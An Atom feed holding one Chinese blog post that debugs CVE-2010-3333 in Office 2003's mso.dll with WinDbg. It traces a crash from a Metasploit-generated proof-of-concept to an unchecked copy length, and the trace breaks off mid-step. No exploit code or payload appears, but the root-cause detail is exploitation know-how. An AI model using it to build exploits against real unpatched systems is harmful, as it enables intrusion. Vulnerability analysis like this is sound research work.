<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://czh11.github.io</id>
    <title>Nono</title>
    <updated>2020-12-20T12:43:09.798Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://czh11.github.io"/>
    <link rel="self" href="https://czh11.github.io/atom.xml"/>
    <subtitle>明天会更好</subtitle>
    <logo>https://czh11.github.io/images/avatar.png</logo>
    <icon>https://czh11.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Nono</rights>
    <entry>
        <title type="html"><![CDATA[CVE-2010-3333]]></title>
        <id>https://czh11.github.io/post/cve-2010-3333/</id>
        <link href="https://czh11.github.io/post/cve-2010-3333/">
        </link>
        <updated>2020-12-20T12:33:15.000Z</updated>
        <content type="html"><![CDATA[<p>cve-2010-3333</p>
<p>首先用msf生成一个poc</p>
<p>打开winword.exe,并用windbg附加进程，再打开生成的poc</p>
<pre><code>(150.6a8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0000c8ac ebx=05000000 ecx=0000019b edx=00000000 esi=1104c24c edi=00130000
eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
mso!Ordinal6426+0x64d:
30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre>
<p>可以看到程序再0x30e9eb88处停止了运行，这里的汇编代码为</p>
<pre><code> rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre>
<p>循环将esi地址处的数据到edi存储地址的内存处。</p>
<p>查看下esi存储地址处的内存</p>
<pre><code>0:000&gt; db esi
1104c24c  4c 74 36 4c 74 37 4c 74-38 4c 74 39 4c 75 30 4c  Lt6Lt7Lt8Lt9Lu0L
1104c25c  75 31 4c 75 32 4c 75 33-4c 75 34 4c 75 35 4c 75  u1Lu2Lu3Lu4Lu5Lu
1104c26c  36 4c 75 37 4c 75 38 4c-75 39 4c 76 30 4c 76 31  6Lu7Lu8Lu9Lv0Lv1
1104c27c  4c 76 32 4c 76 33 4c 76-34 4c 76 35 4c 76 36 4c  Lv2Lv3Lv4Lv5Lv6L
1104c28c  76 37 4c 76 38 4c 76 39-4c 77 30 4c 77 31 4c 77  v7Lv8Lv9Lw0Lw1Lw
1104c29c  32 4c 77 33 4c 77 34 4c-77 35 4c 77 36 4c 77 37  2Lw3Lw4Lw5Lw6Lw7
1104c2ac  4c 77 38 4c 77 39 4c 78-30 4c 78 31 4c 78 32 4c  Lw8Lw9Lx0Lx1Lx2L
1104c2bc  78 33 4c 78 34 4c 78 35-4c 78 36 4c 78 37 4c 78  x3Lx4Lx5Lx6Lx7Lx
</code></pre>
<p>查看edi存储的地址处内存的属性</p>
<pre><code>0:000&gt; !address edi
Usage:                  MemoryMappedFile
Allocation Base:        00130000
Base Address:           00130000
End Address:            00133000
Region Size:            00003000
Type:                   00040000	MEM_MAPPED
State:                  00001000	MEM_COMMIT
Protect:                00000002	PAGE_READONLY
Mapped file name:       PageFile
</code></pre>
<p>可以看到这处内存是只能读的</p>
<p>查看esp存储的地址的内存的数据</p>
<pre><code>0:000&gt; db esp
00123d98  f0 10 4d 01 88 3f 12 00-96 cc f4 30 f0 10 4d 01  ..M..?.....0..M.
00123da8  c0 3d 12 00 00 00 00 00-00 00 00 00 00 00 00 00  .=..............
00123db8  00 00 00 00 00 00 00 00-41 61 30 41 61 31 41 61  ........Aa0Aa1Aa
00123dc8  32 41 61 33 41 61 34 41-61 35 41 61 36 41 61 37  2Aa3Aa4Aa5Aa6Aa7
00123dd8  41 61 38 41 61 39 41 62-30 41 62 31 41 62 32 41  Aa8Aa9Ab0Ab1Ab2A
00123de8  62 33 41 62 34 41 62 35-41 62 36 41 62 37 41 62  b3Ab4Ab5Ab6Ab7Ab
00123df8  38 41 62 39 41 63 30 41-63 31 41 63 32 41 63 33  8Ab9Ac0Ac1Ac2Ac3
00123e08  41 63 34 41 63 35 41 63-36 41 63 37 41 63 38 41  Ac4Ac5Ac6Ac7Ac8A
</code></pre>
<p>查看一下mso的详情信息</p>
<pre><code>0:000&gt; lmm mso v
start    end        module name
30c90000 31837000   mso        (export symbols)       C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
    Loaded symbol image file: C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
    Image path: C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
    Image name: mso.dll
    Timestamp:        Fri Aug 08 15:10:06 2003 (3F334CCE)
    CheckSum:         00BA7175
    ImageSize:        00BA7000
    File version:     11.0.5606.0
    Product version:  11.0.5606.0
    File flags:       0 (Mask 3F)
    File OS:          40004 NT Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0000.04e4
    CompanyName:      Microsoft Corporation
    ProductName:      Microsoft Office 2003
    InternalName:     MSO
    OriginalFilename: MSO.DLL
    ProductVersion:   11.0.5606
    FileVersion:      11.0.5606
    FileDescription:  Microsoft Office 2003 component
    LegalCopyright:   Copyright © 1983-2003 Microsoft Corporation.  All rights reserved.
</code></pre>
<p>从上面得到的信息可以看出，这时在mso.dll上的一处栈溢出漏洞，由于唯有检查复制的内存大小，导致直接覆盖到edi(0x00130000)这处只读地址，照成访问伪例</p>
<p>异常指令在0x30e9eb88处，用windbg重新加载运行并在0x30e9eb88下断点</p>
<pre><code>0:002&gt; bp 30e9eb88
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
0:002&gt; g
ModLoad: 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll
ModLoad: 76590000 765de000   C:\WINDOWS\System32\cscui.dll
ModLoad: 76570000 7658c000   C:\WINDOWS\System32\CSCDLL.dll
ModLoad: 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll
ModLoad: 76960000 76984000   C:\WINDOWS\system32\ntshrui.dll
ModLoad: 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL
ModLoad: 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll
ModLoad: 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll
ModLoad: 7e550000 7e6c1000   C:\WINDOWS\system32\shdocvw.dll
ModLoad: 765e0000 76673000   C:\WINDOWS\system32\CRYPT32.dll
ModLoad: 76db0000 76dc2000   C:\WINDOWS\system32\MSASN1.dll
ModLoad: 75430000 754a1000   C:\WINDOWS\system32\CRYPTUI.dll
ModLoad: 76680000 76726000   C:\WINDOWS\system32\WININET.dll
ModLoad: 76c00000 76c2e000   C:\WINDOWS\system32\WINTRUST.dll
ModLoad: 76c60000 76c88000   C:\WINDOWS\system32\IMAGEHLP.dll
ModLoad: 76f30000 76f5c000   C:\WINDOWS\system32\WLDAP32.dll
ModLoad: 76950000 76958000   C:\WINDOWS\system32\LINKINFO.dll
ModLoad: 36c30000 36c39000   C:\Program Files\Microsoft Office\OFFICE11\msostyle.dll
ModLoad: 39800000 399b3000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL
ModLoad: 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL
ModLoad: 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll
Breakpoint 0 hit
eax=0000c8ac ebx=05000000 ecx=0000322b edx=00000000 esi=1104000c edi=00123dc0
eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x64d:
30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre>
<p>查看栈回溯，定位是哪个函数调用到崩溃函数的</p>
<pre><code>0:000&gt; kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00123dd0 30f4cdbd 00123f3c 00000000 ffffffff mso!Ordinal6426+0x64d
00123e00 30f4a597 00123f88 00123f3c 00000000 mso!Ordinal753+0x306e
0012404c 30d4b199 00000000 0012408c 00000000 mso!Ordinal753+0x848
00124074 30d4b148 30d4ae32 014d14c8 014d1500 mso!Ordinal4196+0x61f
00124078 30d4ae32 014d14c8 014d1500 014d13b0 mso!Ordinal4196+0x5ce
0012407c 014d14c8 014d1500 014d13b0 30dc9d44 mso!Ordinal4196+0x2b8
00124080 014d1500 014d13b0 30dc9d44 00000000 0x14d14c8
00124084 014d13b0 30dc9d44 00000000 014d1118 0x14d1500
00124088 30dc9d44 00000000 014d1118 00124e38 0x14d13b0
0012408c 00000000 014d1118 00124e38 00000000 mso!Ordinal2940+0x158fc
</code></pre>
<pre><code>0:000&gt; ub mso!Ordinal753+0x306e
mso!Ordinal753+0x305a:
30f4cda9 23c1            and     eax,ecx
30f4cdab 50              push    eax
30f4cdac 8d47ff          lea     eax,[edi-1]
30f4cdaf 50              push    eax
30f4cdb0 8b4508          mov     eax,dword ptr [ebp+8]
30f4cdb3 6a00            push    0
30f4cdb5 ff750c          push    dword ptr [ebp+0Ch]
30f4cdb8 e8a0feffff      call    mso!Ordinal753+0x2f0e (30f4cc5d)
</code></pre>
<p>可以看到崩溃函数是在0x30f4cc5d函数中被调用的。</p>
<p>重用windbg加载进程并在0x30f4cc5d函数处下断点</p>
<pre><code>Executable search path is: 
ModLoad: 30000000 30baa000   winword.EXE
ModLoad: 7c920000 7c9b3000   ntdll.dll
ModLoad: 7c800000 7c91e000   C:\WINDOWS\system32\kernel32.dll
ModLoad: 77da0000 77e49000   C:\WINDOWS\system32\ADVAPI32.dll
ModLoad: 77e50000 77ee2000   C:\WINDOWS\system32\RPCRT4.dll
ModLoad: 77fc0000 77fd1000   C:\WINDOWS\system32\Secur32.dll
ModLoad: 77ef0000 77f39000   C:\WINDOWS\system32\GDI32.dll
ModLoad: 77d10000 77da0000   C:\WINDOWS\system32\USER32.dll
ModLoad: 76990000 76acd000   C:\WINDOWS\system32\ole32.dll
ModLoad: 77be0000 77c38000   C:\WINDOWS\system32\msvcrt.dll
(128.4c4): Break instruction exception - code 80000003 (first chance)
eax=00241eb4 ebx=7ffd5000 ecx=00000004 edx=00000010 esi=00241f48 edi=00241eb4
eip=7c92120e esp=0012fb20 ebp=0012fc94 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
ntdll!DbgBreakPoint:
7c92120e cc              int     3
0:000&gt; g
ModLoad: 76300000 7631d000   C:\WINDOWS\system32\IMM32.DLL
ModLoad: 62c20000 62c29000   C:\WINDOWS\system32\LPK.DLL
ModLoad: 73fa0000 7400b000   C:\WINDOWS\system32\USP10.dll
ModLoad: 30c90000 31837000   C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll
ModLoad: 5adc0000 5adf7000   C:\WINDOWS\system32\uxtheme.dll
ModLoad: 77180000 77283000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\Comctl32.dll
ModLoad: 77f40000 77fb6000   C:\WINDOWS\system32\SHLWAPI.dll
ModLoad: 74680000 746cc000   C:\WINDOWS\system32\MSCTF.dll
ModLoad: 77bd0000 77bd8000   C:\WINDOWS\system32\version.dll
ModLoad: 73640000 7366e000   C:\WINDOWS\system32\msctfime.ime
ModLoad: 7d590000 7dd84000   C:\WINDOWS\system32\SHELL32.dll
ModLoad: 5d170000 5d20a000   C:\WINDOWS\system32\comctl32.dll
ModLoad: 7c9c0000 7cc7c000   C:\WINDOWS\system32\msi.dll
ModLoad: 39700000 397e3000   C:\Program Files\Common Files\Microsoft Shared\office11\riched20.dll
ModLoad: 770f0000 7717b000   C:\WINDOWS\system32\OLEAUT32.dll
ModLoad: 76fa0000 7701f000   C:\WINDOWS\system32\CLBCATQ.DLL
ModLoad: 77020000 770ba000   C:\WINDOWS\system32\COMRes.dll
ModLoad: 77bd0000 77bd8000   C:\WINDOWS\system32\VERSION.dll
ModLoad: 01700000 01c49000   C:\WINDOWS\system32\xpsp2res.dll
ModLoad: 75e00000 75eae000   C:\WINDOWS\system32\SXS.DLL
ModLoad: 11000000 1103a000   C:\PROGRA~1\MICROS~3\OFFICE11\ADDINS\SYMINPUT.DLL
ModLoad: 73390000 734e3000   C:\WINDOWS\system32\MSVBVM60.DLL
Microsoft Word On Connection
ConnectMode = 1
Custom(1) = 1
App Version = 11.0
gbIsValidLangSetting = True
gbBootLoad = True
Microsoft Word On AddInsUpdate
Microsoft Word On StartupComplete
ModLoad: 10000000 1002e000   C:\Program Files\Common Files\Microsoft Shared\PROOF\2052\MSGR3SC.DLL
ModLoad: 76320000 76367000   C:\WINDOWS\system32\comdlg32.dll
ModLoad: 3b030000 3b0d9000   C:\WINDOWS\system32\IMSC40A.IME
ModLoad: 3ad70000 3adcd000   C:\PROGRA~1\COMMON~1\MICROS~1\IME\SHARED2.0\MSCAND20.DLL
ModLoad: 762f0000 762f5000   C:\WINDOWS\system32\msimg32.dll
ModLoad: 08d70000 08ded000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\INTLNAME.DLL
ModLoad: 09220000 092a6000   C:\Program Files\Common Files\Microsoft Shared\Smart Tag\CHDATEST.DLL
ModLoad: 092b0000 092c1000   C:\Program Files\Common Files\Microsoft Shared\Smart Tag\Chinese Measurement Converter\CHMETCNV.DLL
ModLoad: 73510000 7353a000   C:\WINDOWS\system32\scrrun.dll
ModLoad: 37320000 37341000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\FNAME.DLL
ModLoad: 72f70000 72f96000   C:\WINDOWS\system32\WINSPOOL.DRV
ModLoad: 74be0000 74c0c000   C:\WINDOWS\system32\OLEACC.dll
ModLoad: 75ff0000 76055000   C:\WINDOWS\system32\MSVCP60.dll
ModLoad: 374b0000 374b9000   C:\PROGRA~1\COMMON~1\MICROS~1\SMARTT~1\2052\stintl.dll
ModLoad: 76060000 761b6000   C:\WINDOWS\system32\SETUPAPI.dll
ModLoad: 09490000 0949c000   C:\WINDOWS\System32\spool\DRIVERS\W32X86\3\mdiui.dll
ModLoad: 094a0000 0956b000   C:\WINDOWS\System32\spool\DRIVERS\W32X86\3\mdigraph.dll
(128.344): Break instruction exception - code 80000003 (first chance)
eax=7ffd5000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
eip=7c92120e esp=0934ffcc ebp=0934fff4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
ntdll!DbgBreakPoint:
7c92120e cc              int     3
0:004&gt; bp 30f4cc5d
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office11\mso.dll - 
0:004&gt; g
ModLoad: 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll
ModLoad: 76590000 765de000   C:\WINDOWS\System32\cscui.dll
ModLoad: 76570000 7658c000   C:\WINDOWS\System32\CSCDLL.dll
ModLoad: 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll
ModLoad: 76960000 76984000   C:\WINDOWS\system32\ntshrui.dll
ModLoad: 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL
ModLoad: 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll
ModLoad: 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll
ModLoad: 7e550000 7e6c1000   C:\WINDOWS\system32\shdocvw.dll
ModLoad: 765e0000 76673000   C:\WINDOWS\system32\CRYPT32.dll
ModLoad: 76db0000 76dc2000   C:\WINDOWS\system32\MSASN1.dll
ModLoad: 75430000 754a1000   C:\WINDOWS\system32\CRYPTUI.dll
ModLoad: 76680000 76726000   C:\WINDOWS\system32\WININET.dll
ModLoad: 76c00000 76c2e000   C:\WINDOWS\system32\WINTRUST.dll
ModLoad: 76c60000 76c88000   C:\WINDOWS\system32\IMAGEHLP.dll
ModLoad: 76f30000 76f5c000   C:\WINDOWS\system32\WLDAP32.dll
ModLoad: 76950000 76958000   C:\WINDOWS\system32\LINKINFO.dll
ModLoad: 36c30000 36c39000   C:\Program Files\Microsoft Office\OFFICE11\msostyle.dll
ModLoad: 39800000 399b3000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL
ModLoad: 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL
ModLoad: 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll
Breakpoint 0 hit
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc5d esp=00123dd4 ebp=00123e00 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f0e:
30f4cc5d 55              push    ebp
</code></pre>
<p>按F10单步跟进</p>
<pre><code>0:000&gt; p
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc5e esp=00123dd0 ebp=00123e00 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f0f:
30f4cc5e 8bec            mov     ebp,esp
0:000&gt; p
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc60 esp=00123dd0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f11:
30f4cc60 83ec14          sub     esp,14h
0:000&gt; t
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc63 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
mso!Ordinal753+0x2f14:
30f4cc63 837d1800        cmp     dword ptr [ebp+18h],0 ss:0023:00123de8=014d14e0
0:000&gt; t
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc67 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f18:
30f4cc67 57              push    edi
0:000&gt; t
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00000000
eip=30f4cc68 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f19:
30f4cc68 8bf8            mov     edi,eax
0:000&gt; t
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc6a esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f1b:
30f4cc6a 0f84b6291300    je      mso!Ordinal1549+0x93fa9 (3107f626)      [br=0]
0:000&gt; p
eax=00123f88 ebx=00000000 ecx=00123dfc edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc70 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f21:
30f4cc70 8b4f08          mov     ecx,dword ptr [edi+8] ds:0023:00123f90=0012408c
0:000&gt; p
eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc73 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f24:
30f4cc73 53              push    ebx
0:000&gt; p
eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc74 esp=00123db4 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f25:
30f4cc74 56              push    esi
0:000&gt; p
eax=00123f88 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc75 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f26:
30f4cc75 e892b4ddff      call    mso!Ordinal6594+0x596 (30d2810c)
0:000&gt; p
eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc7a esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f2b:
30f4cc7a ff750c          push    dword ptr [ebp+0Ch]  ss:0023:00123ddc=00000000
0:000&gt; p
eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=00000000 edi=00123f88
eip=30f4cc7d esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f2e:
30f4cc7d 8b7064          mov     esi,dword ptr [eax+64h] ds:0023:001241b4=014d10f0
0:000&gt; p
eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc80 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mso!Ordinal753+0x2f31:
30f4cc80 8365f800        and     dword ptr [ebp-8],0  ss:0023:00123dc8=fa01d4c8
0:000&gt; p
eax=00124150 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc84 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f35:
30f4cc84 8b06            mov     eax,dword ptr [esi]  ds:0023:014d10f0=30d9ed10
0:000&gt; p
eax=30d9ed10 ebx=00000000 ecx=0012408c edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc86 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f37:
30f4cc86 8d4df0          lea     ecx,[ebp-10h]
0:000&gt; p
eax=30d9ed10 ebx=00000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc89 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f3a:
30f4cc89 51              push    ecx
0:000&gt; p
eax=30d9ed10 ebx=00000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc8a esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f3b:
30f4cc8a bb00000005      mov     ebx,5000000h
0:000&gt; p
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc8f esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f40:
30f4cc8f 56              push    esi
0:000&gt; p
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc90 esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f41:
30f4cc90 895df4          mov     dword ptr [ebp-0Ch],ebx ss:0023:00123dc4=b2b6c000
0:000&gt; p
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30f4cc93 esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal753+0x2f44:
30f4cc93 ff501c          call    dword ptr [eax+1Ch]  ds:0023:30d9ed2c=30e9eb62

</code></pre>
<p>按F8跟进崩溃函数</p>
<pre><code>0:000&gt; t
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30e9eb62 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x627:
30e9eb62 57              push    edi
0:000&gt; t
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123f88
eip=30e9eb63 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x628:
30e9eb63 8b7c240c        mov     edi,dword ptr [esp+0Ch] ss:0023:00123da8=00123dc0
0:000&gt; t
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb67 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mso!Ordinal6426+0x62c:
30e9eb67 85ff            test    edi,edi
0:000&gt; t
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb69 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x62e:
30e9eb69 7427            je      mso!Ordinal6426+0x657 (30e9eb92)        [br=0]
0:000&gt; t
eax=30d9ed10 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb6b esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x630:
30e9eb6b 8b442408        mov     eax,dword ptr [esp+8] ss:0023:00123da4=014d10f0
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=00123dc0 edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb6f esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x634:
30e9eb6f 8b4808          mov     ecx,dword ptr [eax+8] ds:0023:014d10f8=0004c8ac
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0004c8ac edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb72 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x637:
30e9eb72 81e1ffff0000    and     ecx,0FFFFh
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb78 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x63d:
30e9eb78 56              push    esi
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=014d10f0 edi=00123dc0
eip=30e9eb79 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x63e:
30e9eb79 8bf1            mov     esi,ecx
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=0000c8ac edi=00123dc0
eip=30e9eb7b esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x640:
30e9eb7b 0faf742414      imul    esi,dword ptr [esp+14h] ss:0023:00123dac=00000000
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=00000000 edi=00123dc0
eip=30e9eb80 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mso!Ordinal6426+0x645:
30e9eb80 037010          add     esi,dword ptr [eax+10h] ds:0023:014d1100=1104000c
0:000&gt; t
eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123dc0
eip=30e9eb83 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
